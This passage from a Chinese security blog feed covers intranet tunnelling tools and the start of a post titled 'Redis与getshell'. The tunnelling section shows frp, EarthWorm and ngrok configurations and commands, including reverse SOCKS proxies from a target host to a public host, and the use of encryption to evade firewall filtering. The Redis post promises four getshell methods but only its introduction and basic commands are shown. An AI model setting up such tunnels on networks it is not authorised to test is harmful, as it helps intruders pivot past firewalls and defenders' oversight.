x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"># 用于身份验证，请自行修改，要保证服务端与客户端一致</span><br><span class="line">token &#x3D; abcdefgh</span><br><span class="line"></span><br><span class="line">[test_static_file]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line">plugin &#x3D; static_file</span><br><span class="line"># 要对外暴露的文件目录</span><br><span class="line">plugin_local_path &#x3D; &#x2F;tmp&#x2F;file</span><br><span class="line"># 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径</span><br><span class="line">plugin_strip_prefix &#x3D; static</span><br><span class="line">plugin_http_user &#x3D; abc</span><br><span class="line">plugin_http_passwd &#x3D; abc</span><br></pre></td></tr></table></figure></li><li><p>通过浏览器访问 <code>http://x.x.x.x:6000/static/</code> 来查看位于 <code>/tmp/file</code> 目录下的文件，会要求输入已设置好的用户名和密码。</p></li></ol><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><h3 id="统计面板（Dashboard）"><a href="#统计面板（Dashboard）" class="headerlink" title="统计面板（Dashboard）"></a>统计面板（Dashboard）</h3><p>通过浏览器查看 frp 的状态以及代理统计信息展示。</p><p><strong>注：Dashboard 尚未针对大量的 proxy 数据展示做优化，如果出现 Dashboard 访问较慢的情况，请不要启用此功能。</strong></p><p>需要在 frps.ini 中指定 dashboard 服务使用的端口，即可开启此功能：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line"># dashboard 用户名密码，默认都为 admin</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pwd &#x3D; admin</span><br></pre></td></tr></table></figure><p>打开浏览器通过 <code>http://[server_addr]:7500</code> 访问 dashboard 界面，用户名密码默认为 <code>admin</code>。</p><p><img src="https://segmentfault.com/img/bVbDXkk" alt="dashboard"></p><h3 id="加密与压缩"><a href="#加密与压缩" class="headerlink" title="加密与压缩"></a>加密与压缩</h3><p>这两个功能默认是不开启的，需要在 frpc.ini 中通过配置来为指定的代理启用加密与压缩的功能，压缩算法使用 snappy：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>如果公司内网防火墙对外网访问进行了流量识别与屏蔽，例如禁止了 SSH 协议等，通过设置 <code>use_encryption = true</code>，将 frpc 与 frps 之间的通信内容加密传输，将会有效防止流量被拦截。</p><p>如果传输的报文长度较长，通过设置 <code>use_compression = true</code> 对传输内容进行压缩，可以有效减小 frpc 与 frps 之间的网络流量，加快流量转发速度，但是会额外消耗一些 CPU 资源。</p><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><p>从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 <code>frpc.ini</code> 的 <code>common</code> 中配置 <code>tls_enable = true</code> 来启用此功能，安全性更高。</p><p>为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。</p><p><strong>注意： 启用此功能后除 xtcp 外，不需要再设置 use_encryption。</strong></p><h3 id="代理限速"><a href="#代理限速" class="headerlink" title="代理限速"></a>代理限速</h3><p>目前支持在客户端的代理配置中设置代理级别的限速，限制单个 proxy 可以占用的带宽。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br><span class="line">bandwidth_limit &#x3D; 1MB</span><br></pre></td></tr></table></figure><p>在代理配置中增加 <code>bandwidth_limit</code> 字段启用此功能，目前仅支持 <code>MB</code> 和 <code>KB</code> 单位。</p><h3 id="范围端口映射"><a href="#范围端口映射" class="headerlink" title="范围端口映射"></a>范围端口映射</h3><p>在 frpc 的配置文件中可以指定映射多个端口，目前只支持 tcp 和 udp 的类型。</p><p>这一功能通过 <code>range:</code> 段落标记来实现，客户端会解析这个标记中的配置，将其拆分成多个 proxy，每一个 proxy 以数字为后缀命名。</p><p>例如要映射本地 6000-6005, 6007 这 6 个端口，主要配置如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[range:test_tcp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 6000-6006,6007</span><br><span class="line">remote_port &#x3D; 6000-6006,6007</span><br></pre></td></tr></table></figure><p>实际连接成功后会创建 8 个 proxy，命名为 <code>test_tcp_0, test_tcp_1 ... test_tcp_7</code>。</p><h1 id="0x03-ew"><a href="#0x03-ew" class="headerlink" title="0x03 ew"></a>0x03 ew</h1><h2 id="3-1-简介"><a href="#3-1-简介" class="headerlink" title="3.1 简介"></a>3.1 简介</h2><blockquote><p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。但是，现在工具已经不更新了。。。</p></blockquote><p><img src="http://image.v0w.top/Blog/2020-09-07-071504.jpg"></p><h2 id="3-2-特点"><a href="#3-2-特点" class="headerlink" title="3.2 特点"></a>3.2 特点</h2><ol><li>轻量级，C语言编写</li><li>可以设置多级代理</li><li>跨平台</li><li>但是只支持Socks5代理</li></ol><h2 id="3-3-使用方法"><a href="#3-3-使用方法" class="headerlink" title="3.3 使用方法"></a>3.3 使用方法</h2><blockquote><p>以下使用方法均摘自：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p></blockquote><p>以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.</p><p><strong>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。</strong></p><h3 id="1-正向-SOCKS-v5-服务器"><a href="#1-正向-SOCKS-v5-服务器" class="headerlink" title="1. 正向 SOCKS v5 服务器"></a>1. 正向 SOCKS v5 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure><h3 id="2-反弹-SOCKS-v5-服务器"><a href="#2-反弹-SOCKS-v5-服务器" class="headerlink" title="2. 反弹 SOCKS v5 服务器"></a>2. 反弹 SOCKS v5 服务器</h3><p>这个操作具体分两步：<br>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888 </span><br></pre></td></tr></table></figure><p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rssocks -d 1.1.1.1 -e 8888 </span><br></pre></td></tr></table></figure><p>成功。</p><h3 id="3-多级级联"><a href="#3-多级级联" class="headerlink" title="3. 多级级联"></a>3. 多级级联</h3><p>工具中自带的三条端口转发指令， 它们的参数格式分别为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l  1080   -e 8888  </span><br><span class="line">$ .&#x2F;ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999  </span><br><span class="line">$ .&#x2F;ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999</span><br></pre></td></tr></table></figure><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。 首先提供两个“二级级联”本地SOCKS测试样例：</p><p>a) <code>lcx_tran</code> 的用法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s ssocksd  -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure><p>b) <code>lcx_listen</code>、<code>lcx_slave</code> 的用法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">$ .&#x2F;ew -s ssocksd    -l 9999</span><br><span class="line">$ .&#x2F;ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999</span><br></pre></td></tr></table></figure><p>再提供一个“三级级联”的本地SOCKS测试用例以供参考</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;ew -s rcsocks -l 1080 -e 8888 </span><br><span class="line">$ .&#x2F;ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999  </span><br><span class="line">$ .&#x2F;ew -s lcx_listen -l 9999 -e 7777  </span><br><span class="line">$ .&#x2F;ew -s rssocks -d 127.0.0.1 -e 7777</span><br></pre></td></tr></table></figure><p>数据流向: <code>SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</code></p><h1 id="0x04-ngrok"><a href="#0x04-ngrok" class="headerlink" title="0x04 ngrok"></a>0x04 ngrok</h1><h2 id="4-1-简介"><a href="#4-1-简介" class="headerlink" title="4.1 简介"></a>4.1 简介</h2><blockquote><p>ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试。</p></blockquote><h2 id="4-2-特点"><a href="#4-2-特点" class="headerlink" title="4.2 特点"></a>4.2 特点</h2><ol><li>官方维护，一般较为稳定</li><li>跨平台，闭源</li><li>有流量记录和重发功能</li></ol><h2 id="4-3-使用方法"><a href="#4-3-使用方法" class="headerlink" title="4.3 使用方法"></a>4.3 使用方法</h2><ol><li>进入ngrok官网（<a href="https://link.zhihu.com/?target=https://ngrok.com/">https://ngrok.com/</a>），注册ngrok账号并下载ngrok；</li><li>根据官网给定的授权码，运行如下授权命令；</li><li><code>./ngrok authtoken 1hAotxhmORtzCYvUc3BsxDBPh1H_******************</code></li><li><code>./ngrok http 80</code>即可将机器的80端口http服务暴露到公网，并且会提供一个公网域名。</li></ol><p><img src="http://image.v0w.top/Blog/2020-09-07-074519.jpg"></p><p>可以通过官网的UI界面查看数据包和流量等等（但是要付费==、）</p><p><img src="http://image.v0w.top/Blog/2020-09-07-074719.jpg"></p><p>还可以通过一些命令将内网的文件和其他TCP服务 暴露到公网中。</p><p><strong>有授权的设置文件共享</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngrok http -auth&#x3D;&quot;user:password&quot; file:&#x2F;&#x2F;&#x2F;Users&#x2F;alan&#x2F;share</span><br></pre></td></tr></table></figure><p><strong>无授权的设置文件共享</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngrok http &quot;file:&#x2F;&#x2F;&#x2F;C:\Users\alan\Public Folder&quot;</span><br></pre></td></tr></table></figure><p><strong>将主机的3389的TCP端口暴露到公网</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngrok tcp 3389</span><br></pre></td></tr></table></figure><p>更多使用方法参考：<a href="https://ngrok.com/docs">https://ngrok.com/docs</a></p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/7701">内网渗透之内网穿透</a></li><li><a href="https://segmentfault.com/a/1190000021876836">开源内网穿透工具 frp 简单使用教程</a></li><li><a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis与getshell</title>
      <link href="/2020/08/05/Redis-getshell/"/>
      <url>/2020/08/05/Redis-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文主要介绍redis技术是什么，有什么优势，有什么缺点。接着会从安全渗透的角度，剖析其存在的安全隐患，四种getshell的利用方式和防护策略。</p><h1 id="0x01-Redis简介"><a href="#0x01-Redis简介" class="headerlink" title="0x01 Redis简介"></a>0x01 Redis简介</h1><h2 id="1-1-Redis为什么诞生"><a href="#1-1-Redis为什么诞生" class="headerlink" title="1.1 Redis为什么诞生"></a>1.1 Redis为什么诞生</h2><p>首先，Redis是NoSQL的典型案例之一。那么为什么SQL（关系型数据库）用的好好的，突然出现一个NoSQL呢？</p><p>在Web应用发展的初期，那时关系型数据库受到了较为广泛的关注和应用，原因是因为那时候Web站点基本上访问和并发不高、交互也较少。而在后来，随着访问量的提升，使用关系型数据库的Web站点多多少少都开始在性能上出现了一些瓶颈，而瓶颈的源头一般是在磁盘的I/O上。而随着互联网技术的进一步发展，各种类型的应用层出不穷，这导致在当今云计算、大数据盛行的时代，对性能有了更多的需求，主要体现在以下四个方面：</p><ol><li>低延迟的读写速度：应用快速地反应能极大地提升用户的满意度</li><li>支撑海量的数据和流量：对于搜索这样大型应用而言，需要利用PB级别的数据和能应对百万级的流量</li><li>大规模集群的管理：系统管理员希望分布式应用能更简单的部署和管理</li><li>庞大运营成本的考量：IT部门希望在硬件成本、软件成本和人力成本能够有大幅度地降低</li></ol><p>为了克服这一问题，NoSQL应运而生，它同时具备了高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。</p><h2 id="1-2-Redis是什么"><a href="#1-2-Redis是什么" class="headerlink" title="1.2 Redis是什么"></a>1.2 Redis是什么</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</p><ul><li>基于内存运行，性能高效</li><li>支持分布式，理论上可以无限扩展</li><li>key-value存储系统</li><li>开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</li></ul><p>相比于其他数据库类型，Redis具备的特点是：</p><ul><li>C/S通讯模型</li><li>单进程单线程模型</li><li>丰富的数据类型</li><li>操作具有原子性</li><li>持久化</li><li>高并发读写</li><li>支持lua脚本</li></ul><p>哪些大厂在使用Redis？</p><ul><li>github</li><li>twitter</li><li>微博</li><li>Stack Overflow</li><li>阿里巴巴</li><li>百度</li><li>美团</li><li>搜狐</li></ul><h2 id="1-3-Redis应用场景"><a href="#1-3-Redis应用场景" class="headerlink" title="1.3 Redis应用场景"></a>1.3 Redis应用场景</h2><p>Redis 的应用场景包括：缓存系统（“热点”数据：高频读、低频写）、计数器、消息队列系统、排行榜、社交网络和实时系统。</p><h1 id="0x02-Redis基础知识"><a href="#0x02-Redis基础知识" class="headerlink" title="0x02 Redis基础知识"></a>0x02 Redis基础知识</h1><h2 id="2-1-Redis的数据类型"><a href="#2-1-Redis的数据类型" class="headerlink" title="2.1 Redis的数据类型"></a>2.1 Redis的数据类型</h2><p>五种自有数据类型：String类型、哈希类型、列表类型、集合类型和顺序集合类型。</p><h3 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h3><p>不仅能够存储字符串、还能存储图片、视频等多种类型, 最大长度支持512M。</p><p>对每种数据类型，Redis都提供了丰富的操作命令，如：</p><ul><li>GET/MGET</li><li>SET/SETEX/MSET/MSETNX</li><li>INCR/DECR</li><li>GETSET</li><li>DEL</li></ul><h3 id="哈希类型hash"><a href="#哈希类型hash" class="headerlink" title="哈希类型hash"></a>哈希类型hash</h3><p>该类型是由field和关联的value组成的map。其中，field和value都是字符串类型的。</p><p>Hash的操作命令如下：</p><ul><li>HGET/HMGET/HGETALL</li><li>HSET/HMSET/HSETNX</li><li>HEXISTS/HLEN</li><li>HKEYS/HDEL</li><li>HVALS</li></ul><h3 id="列表类型list："><a href="#列表类型list：" class="headerlink" title="列表类型list："></a>列表类型list：</h3><p>该类型是一个插入顺序排序的字符串元素集合, 基于双链表实现。</p><p>List的操作命令如下：</p><ul><li>LPUSH/LPUSHX/LPOP/RPUSH/RPUSHX/RPOP/LINSERT/LSET</li><li>LINDEX/LRANGE</li><li>LLEN/LTRIM</li></ul><h3 id="集合类型set："><a href="#集合类型set：" class="headerlink" title="集合类型set："></a>集合类型set：</h3><p>Set类型是一种无顺序集合, 它和List类型最大的区别是：集合中的元素没有顺序, 且元素是唯一的。</p><p>Set类型的底层是通过哈希表实现的，其操作命令为：</p><ul><li>SADD/SPOP/SMOVE/SCARD</li><li>SINTER/SDIFF/SDIFFSTORE/SUNION</li></ul><p>Set类型主要应用于：在某些场景，如社交场景中，通过交集、并集和差集运算，通过Set类型可以非常方便地查找共同好友、共同关注和共同偏好等社交关系。</p><h2 id="2-2-Redis特性"><a href="#2-2-Redis特性" class="headerlink" title="2.2 Redis特性"></a>2.2 Redis特性</h2><h3 id="Redis特性1：事务"><a href="#Redis特性1：事务" class="headerlink" title="Redis特性1：事务"></a>Redis特性1：事务</h3><ul><li>命令序列化，按顺序执行</li><li>原子性</li><li>三阶段: 开始事务 - 命令入队 - 执行事务</li><li>命令：MULTI/EXEC/DISCARD</li></ul><h3 id="Redis特性2：发布订阅-Pub-Sub"><a href="#Redis特性2：发布订阅-Pub-Sub" class="headerlink" title="Redis特性2：发布订阅(Pub/Sub)"></a>Redis特性2：发布订阅(Pub/Sub)</h3><ul><li>Pub/sub是一种消息通讯模式</li><li>Pub发送消息, Sub接受消息</li><li>Redis客户端可以订阅任意数量的频道</li><li>“fire and forgot”, 发送即遗忘</li><li>命令：Publish/Subscribe/Psubscribe/UnSub</li></ul><p>　　<img src="http://image.v0w.top/Blog/2020-08-09-092255.png"></p><h3 id="Redis特性3：Stream"><a href="#Redis特性3：Stream" class="headerlink" title="Redis特性3：Stream"></a>Redis特性3：Stream</h3><ul><li>Redis 5.0新增</li><li>等待消费</li><li>消费组(组内竞争)</li><li>消费历史数据</li><li>FIFO</li></ul><p><img src="http://image.v0w.top/Blog/2020-08-09-092350.jpg"></p><h2 id="2-3-Redis的命令"><a href="#2-3-Redis的命令" class="headerlink" title="2.3 Redis的命令"></a>2.3 Redis的命令</h2><p>最详细的命令还是要参考手册</p><ul><li><a href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></li><li><a href="http://redisdoc.com/">http://redisdoc.com/</a></li><li><a href="http://redisguide.com/">http://redisguide.com/</a></li></ul><h3 id="2-3-1-Redis连接"><a href="#2-3-1-Redis连接" class="headerlink" title="2.3.1 Redis连接"></a>2.3.1 Redis连接</h3><p><strong>本地连接</strong></p><p>确定本地redis服务启动后。启动 redis 客户端，打开终端并输入命令 redis-cli。该命令会连接本地的 redis 服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-server# 启动redis服务</span><br><span class="line"></span><br><span class="line"> .&#x2F;redis-cli# 启动redis客户端，连接本地服务</span><br><span class="line">127.0.0.1:6379&gt; PING# 测试redis的连通性</span><br><span class="line">PONG</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>远程连接</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redis-cli -h host -p port -a password</span><br></pre></td></tr></table></figure><h3 id="2-3-2-获取Redis信息"><a href="#2-3-2-获取Redis信息" class="headerlink" title="2.3.2 获取Redis信息"></a>2.3.2 获取Redis信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-3-String-类型命令"><a href="#2-3-3-String-类型命令" class="headerlink" title="2.3.3 String 类型命令"></a>2.3.3 String 类型命令</h3><p>String 介绍稍微详细一点，其他的也是类似的，所以就简单介绍。</p><p><strong>SET 系列</strong></p><ol><li><p><code>SET key value [EX seconds] [PX milliseconds] [NX|XX]</code> </p><p>将字符串值 <code>value</code> 关联到 <code>key</code> 。</p><p>如果 <code>key</code> 已经持有其他值， <code>SET</code> 就覆写旧值， 无视类型。</p></li><li><p><code>SETNX key value</code></p><p>只在键 <code>key</code> 不存在的情况下， 将键 <code>key</code> 的值设置为 <code>value</code> 。</p><p>若键 <code>key</code> 已经存在， 则 <code>SETNX</code> 命令不做任何动作。</p><p><code>SETNX</code> 是『SET if Not eXists』(如果不存在，则 SET)的简写。</p></li><li><p><code>SETEX key seconds value</code></p><p>将键 <code>key</code> 的值设置为 <code>value</code> ， 并将键 <code>key</code> 的生存时间设置为 <code>seconds</code> 秒钟。</p><p>如果键 <code>key</code> 已经存在， 那么 <code>SETEX</code> 命令将覆盖已有的值。</p></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;value&quot;</span><br><span class="line"></span><br><span class="line">对已存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;new-value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;new-value&quot;</span><br><span class="line"></span><br><span class="line">使用 EX 选项：将键的过期时间设置为 seconds 秒。</span><br><span class="line">redis&gt; SET key-with-expire-time &quot;hello&quot; EX 10086</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-expire-time</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; TTL key-with-expire-time</span><br><span class="line">(integer) 10069</span><br><span class="line"></span><br><span class="line">使用 PX 选项：将键的过期时间设置为 milliseconds 毫秒。</span><br><span class="line">redis&gt; SET key-with-pexpire-time &quot;moto&quot; PX 123321</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-pexpire-time</span><br><span class="line">&quot;moto&quot;</span><br><span class="line">redis&gt; PTTL key-with-pexpire-time</span><br><span class="line">(integer) 111939</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 NX 选项：只在键不存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; SET not-exists-key &quot;value&quot; NX</span><br><span class="line">OK      # 键不存在，设置成功</span><br><span class="line">redis&gt; GET not-exists-key</span><br><span class="line">&quot;value&quot;</span><br><span class="line">redis&gt; SET not-exists-key &quot;new-value&quot; NX</span><br><span class="line">(nil)   # 键已经存在，设置失败</span><br><span class="line">redis&gt; GEt not-exists-key</span><br><span class="line">&quot;value&quot; # 维持原值不变</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 XX 选项：只在键已经存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; EXISTS exists-key</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot; XX</span><br><span class="line">(nil)   # 因为键不存在，设置失败</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot;</span><br><span class="line">OK      # 先给键设置一个值</span><br><span class="line">redis&gt; SET exists-key &quot;new-value&quot; XX</span><br><span class="line">OK      # 设置新值成功</span><br><span class="line">redis&gt; GET exists-key</span><br><span class="line">&quot;new-value&quot;</span><br></pre></td></tr></table></figure><p><strong>GET系列</strong></p><p><code>GET key</code>: 如果键 <code>key</code> 不存在， 那么返回特殊值 <code>nil</code> ； 否则， 返回键 <code>key</code> 的值。</p><p>如果键 <code>key</code> 的值并非字符串类型， 那么返回一个错误， 因为 <code>GET</code> 命令只能用于字符串值。</p><p><code>GETSET key value</code>: 将键 <code>key</code> 的值设为 <code>value</code> ， 并返回键 <code>key</code> 在被设置之前的旧值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edis&gt; GETSET db mongodb    # 没有旧值，返回 nil</span><br><span class="line">(nil)</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GETSET db redis      # 返回旧值 mongodb</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;redis&quot;</span><br></pre></td></tr></table></figure><p><strong>APPEND key value</strong></p><p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p><p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p><p>追加 <code>value</code> 之后， 返回键 <code>key</code> 的值的长度。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的 key 执行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; EXISTS myphone               # 确保 myphone 不存在</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; APPEND myphone &quot;nokia&quot;       # 对不存在的 key 进行 APPEND ，等同于 SET myphone &quot;nokia&quot;</span><br><span class="line">(integer) 5                         # 字符长度</span><br><span class="line"></span><br><span class="line">对已存在的字符串进行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; APPEND myphone &quot; - 1110&quot;     # 长度从 5 个字符增加到 12 个字符</span><br><span class="line">(integer) 12</span><br><span class="line">redis&gt; GET myphone</span><br><span class="line">&quot;nokia - 1110&quot;</span><br></pre></td></tr></table></figure><p><strong>STRLEN key</strong></p><p>返回键 <code>key</code> 储存的字符串值的长度。</p><p>获取字符串值的长度：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET mykey &quot;Hello world&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; STRLEN mykey</span><br><span class="line">(integer) 11</span><br></pre></td></tr></table></figure><p>不存在的键的长度为 <code>0</code> ：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; STRLEN nonex</span><br></pre></td></tr></table></figure><p><strong>APPEND key value</strong></p><p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p><p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p><p><strong>SETRANGE key offset value</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello world&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SETRANGE greeting 6 &quot;Redis&quot;</span><br><span class="line">(integer) 11</span><br><span class="line"></span><br><span class="line">redis&gt; GET greeting</span><br><span class="line">&quot;hello Redis&quot;</span><br></pre></td></tr></table></figure><p><strong>GETRANGE key start end</strong></p><p>返回键 <code>key</code> 储存的字符串值的指定部分， 字符串的截取范围由 <code>start</code> 和 <code>end</code> 两个偏移量决定 (包括 <code>start</code> 和 <code>end</code> 在内)。</p><p>负数偏移量表示从字符串的末尾开始计数， <code>-1</code> 表示最后一个字符， <code>-2</code> 表示倒数第二个字符， 以此类推。</p><p><code>GETRANGE</code> 通过保证子字符串的值域(range)不超过实际字符串的值域来处理超出范围的值域请求。</p><p>类似SubStr命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello, my friend&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GETRANGE greeting 0 4          # 返回索引0-4的字符，包括4。</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -1 -5        # 不支持回绕操作</span><br><span class="line">&quot;&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -3 -1        # 负数索引</span><br><span class="line">&quot;end&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 -1         # 从第一个到最后一个</span><br><span class="line">&quot;hello, my friend&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 1008611    # 值域范围不超过实际字符串，超过部分自动被符略</span><br><span class="line">&quot;hello, my friend&quot;</span><br></pre></td></tr></table></figure><p><strong>MSET key value [key value …]</strong></p><p>同时对多个键进行设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MSET date &quot;2012.3.30&quot; time &quot;11:00 a.m.&quot; weather &quot;sunny&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET date time weather</span><br><span class="line">1) &quot;2012.3.30&quot;</span><br><span class="line">2) &quot;11:00 a.m.&quot;</span><br><span class="line">3) &quot;sunny&quot;</span><br></pre></td></tr></table></figure><p>覆盖已有的值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) &quot;hello&quot;</span><br><span class="line">2) &quot;world&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MSET k1 &quot;good&quot; k2 &quot;bye&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) 